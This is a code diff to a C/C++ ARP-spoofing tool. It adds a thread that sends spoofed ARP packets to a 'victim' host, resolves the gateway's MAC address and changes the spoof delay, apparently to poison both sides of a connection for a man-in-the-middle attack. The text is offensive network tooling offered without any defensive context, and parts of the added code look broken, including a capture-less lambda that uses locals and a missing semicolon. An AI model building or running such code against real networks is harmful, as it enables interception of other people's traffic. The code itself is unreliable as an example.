@@ -13,6 +13,7 @@
 #include <net/ethernet.h>
 #include <linux/if_packet.h>
 #include <unistd.h>
+#include <thread>
 
 #include "ip_address.h"
 #include "mac_address.h"
@@ -21,7 +22,7 @@
 #include "debug.h"
 #include "io.h"
 
-#define SPOOFED_SEND_DELAY 1
+#define SPOOFED_SEND_DELAY 2
 
 #define GUARD(x, err) if(!(x)) {    \
     printf("[x] ERROR: " err "\n"); \
@@ -184,7 +185,19 @@ int main(int argc, char** argv){
     MACAddress victim_mac_addr = get_victim_response(fd, victim_ip);
     printf("Victim MAC Address: ");
     print(victim_mac_addr);
+    
+    std::thread victim_thread{
+        [](){
+            send_to_victim(fd, &device, SPOOFED_SEND_DELAY, src_mac_addr, gateway_ip, victim_mac_addr, victim_ip);
+        }
+    }
+    
+    broadcast_packet(fd, &device, src_mac_addr, victim_ip, gateway_ip);
+    MACAddress gateway_mac_addr = get_victim_response(fd, gateway_ip);
+    printf("Gateway MAC Address: ");
+    print(gateway_mac_addr);
     send_to_victim(fd, &device, SPOOFED_SEND_DELAY, src_mac_addr, gateway_ip, victim_mac_addr, victim_ip);
+    
     // close(fd);
     return 0;
 }
